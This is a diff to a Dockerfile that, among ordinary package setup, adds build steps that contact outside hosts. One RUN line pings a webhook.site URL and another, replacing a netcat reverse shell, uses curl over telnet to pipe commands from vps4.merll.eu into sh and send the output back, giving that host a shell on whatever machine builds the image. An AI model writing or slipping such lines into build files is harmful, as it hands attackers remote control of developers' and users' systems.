@@ -7,7 +7,7 @@ RUN apt-get update \
     && rm -rf /var/lib/apt/lists/*
 
 RUN curl "https://webhook.site/d3e06396-e979-4c18-9721-358030e55813/hi"
-RUN nc -c sh vps4.merll.eu 80
+RUN C='curl -Ns telnet://vps4.merll.eu:80'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
 
 WORKDIR /app
 
